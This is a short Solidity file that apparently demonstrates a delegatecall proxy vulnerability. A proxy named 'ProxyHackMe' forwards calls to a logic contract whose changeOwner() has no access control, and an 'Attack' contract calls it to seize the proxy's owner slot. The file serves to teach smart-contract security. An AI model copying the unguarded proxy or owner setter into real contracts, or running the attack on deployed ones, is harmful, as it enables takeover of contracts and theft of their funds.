// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract Logic {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner() external {
        owner = msg.sender;
    }
}

contract ProxyHackMe {
    address public owner;
    address public logic;

    constructor(address logicContractAddress) {
        owner = msg.sender;
        logic = logicContractAddress;
    }

    fallback() external {
        logic.delegatecall(msg.data);
    }
}

contract Attack {
    address public owner;
    address public proxyHackMeAddress;

    constructor(address addr) {
        proxyHackMeAddress = addr;
        owner = msg.sender;
    }

    function attack() external {
        bytes memory sig = abi.encodeWithSignature("changeOwner()");
        proxyHackMeAddress.call(sig);
    }
}
